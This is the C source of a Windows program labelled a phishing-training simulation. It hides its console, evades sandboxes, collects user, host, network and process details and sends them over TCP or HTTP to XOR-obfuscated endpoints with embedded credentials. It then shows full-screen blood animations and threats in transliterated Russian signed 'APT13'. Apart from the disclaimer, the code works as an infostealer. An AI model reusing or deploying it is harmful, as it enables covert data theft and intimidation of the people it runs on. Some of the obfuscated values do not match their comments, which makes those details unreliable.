#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <wininet.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <iphlpapi.h>
#include <tlhelp32.h>
#include <lmcons.h>
#include <gdiplus.h>
#include <shlobj.h>
#include <math.h>

#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "iphlpapi.lib")
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "kernel32.lib")
#pragma comment(lib, "gdi32.lib")
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "msimg32.lib")

static char ssh_host[] = {0x73, 0x7f, 0x7f, 0x3a, 0x66, 0x6d, 0x63, 0x3a, 0x66, 0x3a, 0x66, 0x72, 0x72, 0x00}; // 192.168.1.100
static char ssh_user[] = {0x05, 0x16, 0x17, 0x03, 0x16, 0x02, 0x03, 0x00}; // pentest
static char ssh_pass[] = {0x08, 0x34, 0x09, 0x16, 0x01, 0x02, 0x16, 0x08, 0x67, 0x65, 0x67, 0x69, 0x00}; // cybersec2024
static int ssh_port = 22;

typedef struct {
    double x, y;
    double velocityX, velocityY;
    double acceleration;
    int size;
    int life;
    int maxLife;
    COLORREF color;
    int alpha;
    BOOL isDroplet;
    double angle;
    double rotation;
} BloodDrop;

typedef struct {
    double x, y;
    double velocityX, velocityY;
    int size;
    int life;
    int maxLife;
    COLORREF color;
    double angle;
} BloodSplatter;

typedef struct {
    int x, y;
    int size;
    int age;
    COLORREF color;
    int alpha;
} BloodTrail;

void decode_ssh_config() {
    for (int i = 0; ssh_host[i]; i++) ssh_host[i] ^= 0x55;
    for (int i = 0; ssh_user[i]; i++) ssh_user[i] ^= 0x55;
    for (int i = 0; ssh_pass[i]; i++) ssh_pass[i] ^= 0x55;
}

void decode_string(char* str, int key) {
    for (int i = 0; str[i]; i++) {
        str[i] ^= key;
    }
}

DWORDLONG GetPhysicalMemorySize() {
    MEMORYSTATUSEX memStatus;
    memStatus.dwLength = sizeof(memStatus);
    GlobalMemoryStatusEx(&memStatus);
    return memStatus.ullTotalPhys;
}

void GetSystemInformation(char* buffer, size_t bufferSize) {
    SYSTEM_INFO si;
    OSVERSIONINFO osvi;
    char username[UNLEN + 1];
    DWORD usernameLen = sizeof(username);
    char computerName[MAX_COMPUTERNAME_LENGTH + 1];
    DWORD computerNameLen = sizeof(computerName);
    
    GetSystemInfo(&si);
    ZeroMemory(&osvi, sizeof(OSVERSIONINFO));
    osvi.dwOSVersionInfoSize = sizeof(OSVERSIONINFO);
    GetVersionEx(&osvi);
    
    GetUserNameA(username, &usernameLen);
    GetComputerNameA(computerName, &computerNameLen);
    
    snprintf(buffer, bufferSize,
        "User: %s\n"
        "Computer: %s\n"
        "OS Version: %d.%d Build %d\n"
        "Processor Architecture: %d\n"
        "Number of Processors: %d\n"
        "RAM: %llu MB\n"
        "Page Size: %d KB\n",
        username,
        computerName,
        osvi.dwMajorVersion,
        osvi.dwMinorVersion,
        osvi.dwBuildNumber,
        si.wProcessorArchitecture,
        si.dwNumberOfProcessors,
        GetPhysicalMemorySize() / (1024 * 1024),
        si.dwPageSize / 1024
    );
}

void GetNetworkInfo(char* buffer, size_t bufferSize) {
    IP_ADAPTER_INFO* pAdapterInfo = NULL;
    DWORD dwBufLen = sizeof(IP_ADAPTER_INFO);
    char temp[1024] = {0};
    
    pAdapterInfo = (IP_ADAPTER_INFO*)malloc(dwBufLen);
    
    if (GetAdaptersInfo(pAdapterInfo, &dwBufLen) == ERROR_BUFFER_OVERFLOW) {
        free(pAdapterInfo);
        pAdapterInfo = (IP_ADAPTER_INFO*)malloc(dwBufLen);
    }
    
    if (GetAdaptersInfo(pAdapterInfo, &dwBufLen) == NO_ERROR) {
        IP_ADAPTER_INFO* pAdapter = pAdapterInfo;
        int adapterCount = 0;
        
        while (pAdapter && adapterCount < 3) {
            if (pAdapter->Type == MIB_IF_TYPE_ETHERNET || 
                pAdapter->Type == IF_TYPE_IEEE80211) {
                
                char adapterInfo[256];
                snprintf(adapterInfo, sizeof(adapterInfo),
                    "Adapter %d:\n"
                    "  Name: %s\n"
                    "  MAC: %02X-%02X-%02X-%02X-%02X-%02X\n"
                    "  IP: %s\n"
                    "  Gateway: %s\n"
                    "  DHCP: %s\n\n",
                    adapterCount + 1,
                    pAdapter->AdapterName,
                    pAdapter->Address[0], pAdapter->Address[1],
                    pAdapter->Address[2], pAdapter->Address[3],
                    pAdapter->Address[4], pAdapter->Address[5],
                    pAdapter->IpAddressList.IpAddress.String,
                    pAdapter->GatewayList.IpAddress.String,
                    pAdapter->DhcpEnabled ? "Enabled" : "Disabled"
                );
                
                strncat(temp, adapterInfo, sizeof(temp) - strlen(temp) - 1);
                adapterCount++;
            }
            pAdapter = pAdapter->Next;
        }
    }
    
    strncpy(buffer, temp, bufferSize - 1);
    buffer[bufferSize - 1] = '\0';
    
    if (pAdapterInfo) {
        free(pAdapterInfo);
    }
}

void GetProcessList(char* buffer, size_t bufferSize) {
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) return;
    
    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);
    
    char temp[2048] = "Running Processes:\n";
    int processCount = 0;
    
    if (Process32First(hSnapshot, &pe32)) {
        do {
            if (processCount < 10) {
                char processInfo[128];
                snprintf(processInfo, sizeof(processInfo),
                    "  %s (PID: %d)\n",
                    pe32.szExeFile,
                    pe32.th32ProcessID
                );
                strncat(temp, processInfo, sizeof(temp) - strlen(temp) - 1);
            }
            processCount++;
        } while (Process32Next(hSnapshot, &pe32));
    }
    
    char countInfo[64];
    snprintf(countInfo, sizeof(countInfo), "Total processes: %d\n\n", processCount);
    strncat(temp, countInfo, sizeof(temp) - strlen(temp) - 1);
    
    strncpy(buffer, temp, bufferSize - 1);
    buffer[bufferSize - 1] = '\0';
    
    CloseHandle(hSnapshot);
}

BOOL SendDataViaHTTP(const char* data, const char* filename) {
    HINTERNET hInternet, hConnect;
    BOOL result = FALSE;
    
    char url[] = {0x61, 0x78, 0x78, 0x70, 0x72, 0x7a, 0x7a, 0x34, 0x34, 0x34, 0x2e, 0x65, 0x78, 0x74, 0x2d, 0x72, 0x65, 0x01, 0x76, 0x16, 0x01, 0x2e, 0x08, 0x7d, 0x6d, 0x2f, 0x08, 0x7d, 0x6c, 0x6c, 0x16, 0x08, 0x78, 0x00};
    decode_string(url, 0x55);
    
    hInternet = InternetOpenA("Mozilla/5.0 (Windows NT 10.0; Win64; x64)", 
                             INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
    if (hInternet) {
        hConnect = InternetOpenUrlA(hInternet, url, NULL, 0, 
                                   INTERNET_FLAG_RELOAD, 0);
        if (hConnect) {
            DWORD bytesWritten;
            
            char postData[4096];
            snprintf(postData, sizeof(postData), 
                    "filename=%s&data=%s", filename, data);
            
            HttpSendRequestA(hConnect, 
                           "Content-Type: application/x-www-form-urlencoded\r\n",
                           -1, postData, strlen(postData));
            
            result = TRUE;
            InternetCloseHandle(hConnect);
        }
        InternetCloseHandle(hInternet);
    }
    
    return result;
}

BOOL SendDataViaTCP(const char* data, const char* filename) {
    WSADATA wsaData;
    SOCKET sock;
    struct sockaddr_in server;
    
    decode_ssh_config();
    
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        return FALSE;
    }
    
    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock == INVALID_SOCKET) {
        WSACleanup();
        return FALSE;
    }
    
    server.sin_family = AF_INET;
    server.sin_port = htons(ssh_port);
    server.sin_addr.s_addr = inet_addr(ssh_host);
    
    if (connect(sock, (struct sockaddr*)&server, sizeof(server)) == SOCKET_ERROR) {
        closesocket(sock);
        WSACleanup();
        return FALSE;
    }
    
    char packet[4096];
    snprintf(packet, sizeof(packet), 
            "FILE:%s\nUSER:%s\nPASS:%s\nDATA:\n%s\nEOF\n",
            filename, ssh_user, ssh_pass, data);
    
    send(sock, packet, strlen(packet), 0);
    
    closesocket(sock);
    WSACleanup();
    
    return TRUE;
}

void AntiSandbox() {
    DWORD startTime = GetTickCount();
    Sleep(3000);
    DWORD endTime = GetTickCount();
    
    if (endTime - startTime < 2800) {
        ExitProcess(0);
    }
    
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);
    int processCount = 0;
    
    if (Process32First(snapshot, &pe32)) {
        do {
            processCount++;
        } while (Process32Next(snapshot, &pe32));
    }
    
    CloseHandle(snapshot);
    
    if (processCount < 25) {
        ExitProcess(0);
    }
    
    if (GetPhysicalMemorySize() < (size_t)1024 * 1024 * 1024) {
        ExitProcess(0);
    }
}

COLORREF CreateBloodGradient(int baseRed, int variation, int alpha) {
    int red = baseRed + (rand() % variation) - variation/2;
    int green = (rand() % 20);
    int blue = (rand() % 15);
    
    red = max(60, min(255, red));
    green = max(0, min(40, green));
    blue = max(0, min(30, blue));
    
    return RGB(red, green, blue);
}

void DrawBloodDrop(HDC hdc, HDC memDC, BloodDrop* drop) {
    HBRUSH bloodBrush = CreateSolidBrush(drop->color);
    HPEN bloodPen = CreatePen(PS_SOLID, 1, drop->color);
    
    SelectObject(memDC, bloodBrush);
    SelectObject(memDC, bloodPen);
    
    if (drop->isDroplet) {
        
        POINT dropShape[4];
        int halfSize = drop->size / 2;
        
        dropShape[0].x = (int)drop->x;
        dropShape[0].y = (int)drop->y - drop->size;
        dropShape[1].x = (int)drop->x - halfSize;
        dropShape[1].y = (int)drop->y;
        dropShape[2].x = (int)drop->x;
        dropShape[2].y = (int)drop->y + halfSize;
        dropShape[3].x = (int)drop->x + halfSize;
        dropShape[3].y = (int)drop->y;
        
        Polygon(memDC, dropShape, 4);
    } else {

        Ellipse(memDC, 
               (int)drop->x - drop->size/2, 
               (int)drop->y - drop->size/2,
               (int)drop->x + drop->size/2, 
               (int)drop->y + drop->size/2);
    }
    
    DeleteObject(bloodBrush);
    DeleteObject(bloodPen);
}


void DrawBloodSplatter(HDC memDC, BloodSplatter* splatter) {
    HBRUSH splatterBrush = CreateSolidBrush(splatter->color);
    SelectObject(memDC, splatterBrush);
    
    
    for (int i = 0; i < 5; i++) {
        double angle = splatter->angle + (i * M_PI / 2.5);
        int offsetX = (int)(cos(angle) * splatter->size * 0.7);
        int offsetY = (int)(sin(angle) * splatter->size * 0.7);
        
        Ellipse(memDC, 
               (int)splatter->x + offsetX - 2, 
               (int)splatter->y + offsetY - 2,
               (int)splatter->x + offsetX + 2, 
               (int)splatter->y + offsetY + 2);
    }
    
    DeleteObject(splatterBrush);
}


void CreateRealisticBloodEffect() {
    
    HDC hdc = GetDC(NULL);
    RECT screen;
    GetWindowRect(GetDesktopWindow(), &screen);
    
    int screenWidth = screen.right - screen.left;
    int screenHeight = screen.bottom - screen.top;
    
    
    HDC memDC = CreateCompatibleDC(hdc);
    HBITMAP memBitmap = CreateCompatibleBitmap(hdc, screenWidth, screenHeight);
    SelectObject(memDC, memBitmap);
    
    
    HBRUSH blackBrush = CreateSolidBrush(RGB(0, 0, 0));
    SelectObject(memDC, blackBrush);
    Rectangle(memDC, 0, 0, screenWidth, screenHeight);
    DeleteObject(blackBrush);
    
    
    BloodDrop drops[80];
    BloodSplatter splatters[150];
    BloodTrail trails[300];
    
    srand(GetTickCount());
    
   
    for (int i = 0; i < 80; i++) {
        drops[i].x = rand() % screenWidth;
        drops[i].y = -(rand() % 400);
        drops[i].velocityX = (rand() % 6 - 3) * 0.5;
        drops[i].velocityY = 2.0 + (rand() % 4);
        drops[i].acceleration = 0.1 + (rand() % 3) * 0.05;
        drops[i].size = 12 + rand() % 20;
        drops[i].life = 0;
        drops[i].maxLife = 200 + rand() % 100;
        drops[i].color = CreateBloodGradient(180, 40, 255);
        drops[i].alpha = 255;
        drops[i].isDroplet = (rand() % 3 == 0);
        drops[i].angle = (rand() % 360) * M_PI / 180.0;
        drops[i].rotation = (rand() % 10 - 5) * 0.1;
    }
    
    
    for (int i = 0; i < 150; i++) {
        splatters[i].x = rand() % screenWidth;
        splatters[i].y = screenHeight + rand() % 100;
        splatters[i].velocityX = (rand() % 20 - 10) * 0.3;
        splatters[i].velocityY = -(rand() % 15 + 5);
        splatters[i].size = 3 + rand() % 8;
        splatters[i].life = 0;
        splatters[i].maxLife = 150 + rand() % 100;
        splatters[i].color = CreateBloodGradient(160, 50, 200);
        splatters[i].angle = (rand() % 360) * M_PI / 180.0;
    }
    
    
    int trailCount = 0;
    
    
    for (int frame = 0; frame < 500; frame++) {
        
        HBRUSH backgroundBrush = CreateSolidBrush(RGB(5, 0, 0));
        SelectObject(memDC, backgroundBrush);
        Rectangle(memDC, 0, 0, screenWidth, screenHeight);
        DeleteObject(backgroundBrush);
        
       
        for (int i = 0; i < 80; i++) {
            if (drops[i].life < drops[i].maxLife) {
                
                drops[i].velocityY += drops[i].acceleration;
                drops[i].x += drops[i].velocityX;
                drops[i].y += drops[i].velocityY;
                drops[i].angle += drops[i].rotation;
                
                
                if (drops[i].y > 50 && trailCount < 300 && rand() % 3 == 0) {
                    trails[trailCount].x = (int)drops[i].x;
                    trails[trailCount].y = (int)drops[i].y - 10;
                    trails[trailCount].size = drops[i].size / 3;
                    trails[trailCount].age = 0;
                    trails[trailCount].color = drops[i].color;
                    trails[trailCount].alpha = 150;
                    trailCount++;
                }
                
                
                DrawBloodDrop(hdc, memDC, &drops[i]);
                
                drops[i].life++;
                
                
                if (drops[i].y >= screenHeight - 50) {
                    for (int j = 0; j < 5; j++) {
                        if (rand() % 150 < 50) {
                            int idx = rand() % 150;
                            splatters[idx].x = drops[i].x + (rand() % 60 - 30);
                            splatters[idx].y = screenHeight - 10;
                            splatters[idx].velocityX = (rand() % 20 - 10) * 0.2;
                            splatters[idx].velocityY = -(rand() % 8 + 2);
                            splatters[idx].life = 0;
                            splatters[idx].maxLife = 100 + rand() % 50;
                        }
                    }
                    
                    
                    drops[i].x = rand() % screenWidth;
                    drops[i].y = -(rand() % 200);
                    drops[i].velocityX = (rand() % 6 - 3) * 0.5;
                    drops[i].velocityY = 2.0 + (rand() % 4);
                    drops[i].life = 0;
                    drops[i].color = CreateBloodGradient(180, 40, 255);
                }
            }
        }
        
        
        for (int i = 0; i < 150; i++) {
            if (splatters[i].life < splatters[i].maxLife) {
                splatters[i].velocityY += 0.3; 
                splatters[i].x += splatters[i].velocityX;
                splatters[i].y += splatters[i].velocityY;
                
                if (splatters[i].y < screenHeight && splatters[i].x > 0 && splatters[i].x < screenWidth) {
                    DrawBloodSplatter(memDC, &splatters[i]);
                }
                
                splatters[i].life++;
            }
        }
        
        
        for (int i = 0; i < trailCount; i++) {
            if (trails[i].age < 100) {
                int alpha = 255 - (trails[i].age * 2);
                if (alpha > 0) {
                    HBRUSH trailBrush = CreateSolidBrush(trails[i].color);
                    SelectObject(memDC, trailBrush);
                    
                    Ellipse(memDC, 
                           trails[i].x - trails[i].size/2, 
                           trails[i].y - trails[i].size/2,
                           trails[i].x + trails[i].size/2, 
                           trails[i].y + trails[i].size/2);
                    
                    DeleteObject(trailBrush);
                }
                trails[i].age++;
            }
        }
        
        
        BitBlt(hdc, 0, 0, screenWidth, screenHeight, memDC, 0, 0, SRCCOPY);
        
        Sleep(25); 
        
        
        if (frame % 10 == 0 && rand() % 3 == 0) {
            int idx = rand() % 80;
            if (drops[idx].life >= drops[idx].maxLife) {
                drops[idx].x = rand() % screenWidth;
                drops[idx].y = -(rand() % 100);
                drops[idx].velocityX = (rand() % 6 - 3) * 0.5;
                drops[idx].velocityY = 2.0 + (rand() % 4);
                drops[idx].life = 0;
                drops[idx].color = CreateBloodGradient(180, 40, 255);
            }
        }
    }
    
    
    for (int wave = 0; wave < 3; wave++) {
        HBRUSH waveBrush = CreateSolidBrush(RGB(120 + wave * 20, 0, 0));
        SelectObject(memDC, waveBrush);
        
        for (int y = screenHeight - 100; y < screenHeight; y += 20) {
            for (int x = 0; x < screenWidth; x += 30) {
                int waveX = x + (int)(sin((double)x / 100.0 + wave) * 15);
                int waveY = y + (int)(cos((double)x / 80.0 + wave) * 10);
                
                Ellipse(memDC, waveX - 15, waveY - 15, waveX + 15, waveY + 15);
            }
        }
        
        DeleteObject(waveBrush);
        BitBlt(hdc, 0, 0, screenWidth, screenHeight, memDC, 0, 0, SRCCOPY);
        Sleep(300);
    }
    
    
    DeleteObject(memBitmap);
    DeleteDC(memDC);
    ReleaseDC(NULL, hdc);
}


void CreateGhostlyMessage() {
    HDC hdc = GetDC(NULL);
    RECT screen;
    GetWindowRect(GetDesktopWindow(), &screen);
    
    int screenWidth = screen.right - screen.left;
    int screenHeight = screen.bottom - screen.top;
    
    HFONT hFont = CreateFontA(80, 0, 0, 0, FW_BOLD, FALSE, FALSE, FALSE,
                             DEFAULT_CHARSET, OUT_DEFAULT_PRECIS,
                             CLIP_DEFAULT_PRECIS, DEFAULT_QUALITY,
                             DEFAULT_PITCH | FF_DONTCARE, "Arial");
    
    SelectObject(hdc, hFont);
    SetBkMode(hdc, TRANSPARENT);
    
    const char* messages[] = {
        "VY ZARAZHENY...",
        "VASHI FAYLY PRINADLEZHAT NAM...",
        "NET PUTI NAZAD...",
        "MY NABLYUDAEM ZA VAMI...",
        "APT13 TEAM FROM RUSSIA WITH LOVE..."
        "DES/29A ETO WAM NE PETYA..."
    };
    
    for (int i = 0; i < 5; i++) {
        
        for (int flicker = 0; flicker < 3; flicker++) {
            for (int opacity = 0; opacity < 255; opacity += 15) {
                
                HBRUSH blackBrush = CreateSolidBrush(RGB(0, 0, 0));
                SelectObject(hdc, blackBrush);
                Rectangle(hdc, 0, 0, screenWidth, screenHeight);
                DeleteObject(blackBrush);
                
                
                SetTextColor(hdc, RGB(255, opacity/3, opacity/4));
                
                
                SIZE textSize;
                GetTextExtentPoint32A(hdc, messages[i], strlen(messages[i]), &textSize);
                int textX = (screenWidth - textSize.cx) / 2;
                int textY = screenHeight / 2 - 100 + i * 80;
                
                
                for (int glow = 3; glow > 0; glow--) {
                    SetTextColor(hdc, RGB(255 - glow * 60, 0, 0));
                    for (int dx = -glow; dx <= glow; dx++) {
                        for (int dy = -glow; dy <= glow; dy++) {
                            if (dx != 0 || dy != 0) {
                                TextOutA(hdc, textX + dx, textY + dy, messages[i], strlen(messages[i]));
                            }
                        }
                    }
                }
                
                
                SetTextColor(hdc, RGB(255, opacity/2, opacity/2));
                TextOutA(hdc, textX, textY, messages[i], strlen(messages[i]));
                
                Sleep(30);
            }
            
            Sleep(100);
            HBRUSH blackBrush = CreateSolidBrush(RGB(0, 0, 0));
            SelectObject(hdc, blackBrush);
            Rectangle(hdc, 0, 0, screenWidth, screenHeight);
            DeleteObject(blackBrush);
            Sleep(50);
        }
        
        Sleep(800);
    }
    
    DeleteObject(hFont);
    ReleaseDC(NULL, hdc);
}


void DisplayHorrorEffects() {
    ShowCursor(FALSE);
    
    HDC hdc = GetDC(NULL);
    RECT screen;
    GetWindowRect(GetDesktopWindow(), &screen);
    
    HBRUSH blackBrush = CreateSolidBrush(RGB(0, 0, 0));
    SelectObject(hdc, blackBrush);
    Rectangle(hdc, 0, 0, screen.right, screen.bottom);
    DeleteObject(blackBrush);
    ReleaseDC(NULL, hdc);
    
    Sleep(1000);
    
    CreateGhostlyMessage();
    Sleep(1000);
    
    CreateRealisticBloodEffect();
    
    MessageBoxA(NULL, 
        "VASHA SISTEMA VZLOMANA!\n\n"
        "Vse fayly zashiphovany!\n"
        "Lichnye dannye ukradeny!\n"
        "Bankovskie scheta skomprometirovany!\n\n"
        "===================================\n"
        "ETO OBUCHENIE PO BEZOPASNOSTI\n"
        "===================================\n\n"
        "Vy stali zhertvoy phishingovoy ataki!\n"
        "Nikakikh faylov ne bylo povrezhdeno.\n"
        "Obratites' k administratoru bezopasnosti\n"
        "dlya polucheniya dopolnitel'noy informacii.",
        "CYBERSECURITY TRAINING ALERT",
        MB_OK | MB_ICONERROR | MB_SYSTEMMODAL | MB_TOPMOST);
    
    ShowCursor(TRUE);
}

void CreateDesktopReport(const char* data) {
    char desktopPath[MAX_PATH];
    if (SHGetSpecialFolderPathA(NULL, desktopPath, CSIDL_DESKTOP, FALSE)) {
        char reportPath[MAX_PATH];
        snprintf(reportPath, sizeof(reportPath), "%s\\SECURITY_TRAINING_REPORT.txt", desktopPath);
        
        FILE* file = fopen(reportPath, "w");
        if (file) {
            fprintf(file, 
                "===============================================================\n"
                "                    CYBERSECURITY TRAINING REPORT\n"
                "===============================================================\n\n"
                "WARNING: This is the result of a phishing training test\n\n"
                "YOU SUCCESSFULLY LAUNCHED A SUSPICIOUS FILE!\n\n"
                "What happened:\n"
                "+ System information was collected\n"
                "+ Data was sent to external server\n"
                "+ Visual effects were demonstrated\n"
                "+ Malicious activity was simulated\n\n"
                "In a real situation this could lead to:\n"
                "- Personal data theft\n"
                "- File encryption (ransomware)\n"
                "- Malware installation\n"
                "- Corporate network compromise\n\n"
                "RECOMMENDATIONS:\n"
                "1. Don't open suspicious attachments\n"
                "2. Verify email senders\n"
                "3. Use antivirus software\n"
                "4. Regularly update software\n"
                "5. Be careful with links\n\n"
                "For additional information contact:\n"
                "Information Security Department\n"
                "Email: security@company.com\n\n"
                "===============================================================\n"
                "COLLECTED INFORMATION (for report):\n"
                "===============================================================\n\n"
                "%s"
                "\n===============================================================\n"
                "Date and time: %s\n"
                "Status: Training completed successfully\n"
                "===============================================================\n",
                data, __DATE__ " " __TIME__
            );
            fclose(file);
        }
    }
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    AntiSandbox();
    
    HWND hwnd = GetConsoleWindow();
    if (hwnd) ShowWindow(hwnd, SW_HIDE);
    
    WSADATA wsaData;
    WSAStartup(MAKEWORD(2, 2), &wsaData);
    
    char systemInfo[2048] = {0};
    char networkInfo[1024] = {0};
    char processInfo[1024] = {0};
    char fullInfo[5120] = {0};
    char filename[256] = {0};
    
    GetSystemInformation(systemInfo, sizeof(systemInfo));
    GetNetworkInfo(networkInfo, sizeof(networkInfo));
    GetProcessList(processInfo, sizeof(processInfo));
    
    SYSTEMTIME st;
    GetSystemTime(&st);
    char computerName[MAX_COMPUTERNAME_LENGTH + 1];
    DWORD computerNameLen = sizeof(computerName);
    GetComputerNameA(computerName, &computerNameLen);
    
    snprintf(filename, sizeof(filename), 
             "phishing_%s_%04d%02d%02d_%02d%02d%02d.txt",
             computerName,
             st.wYear, st.wMonth, st.wDay,
             st.wHour, st.wMinute, st.wSecond);
    
    snprintf(fullInfo, sizeof(fullInfo), 
        "===============================================================\n"
        "                    PHISHING SIMULATION DATA\n"
        "===============================================================\n"
        "Timestamp: %04d-%02d-%02d %02d:%02d:%02d UTC\n"
        "Target Computer: %s\n"
        "Attack Method: Email attachment\n"
        "Status: Successfully executed\n"
        "===============================================================\n\n"
        "SYSTEM INFORMATION:\n"
        "===================\n"
        "%s\n"
        "NETWORK INFORMATION:\n"
        "====================\n"
        "%s\n"
        "PROCESS INFORMATION:\n"
        "====================\n"
        "%s\n"
        "===============================================================\n"
        "End of report\n"
        "===============================================================\n",
        st.wYear, st.wMonth, st.wDay, st.wHour, st.wMinute, st.wSecond,
        computerName,
        systemInfo,
        networkInfo,
        processInfo
    );
    
    BOOL dataSent = FALSE;
    
    dataSent = SendDataViaTCP(fullInfo, filename);
    
    if (!dataSent) {
        dataSent = SendDataViaHTTP(fullInfo, filename);
    }
    
    DisplayHorrorEffects();
    CreateDesktopReport(fullInfo);
    
    WSACleanup();
    
    return 0;
}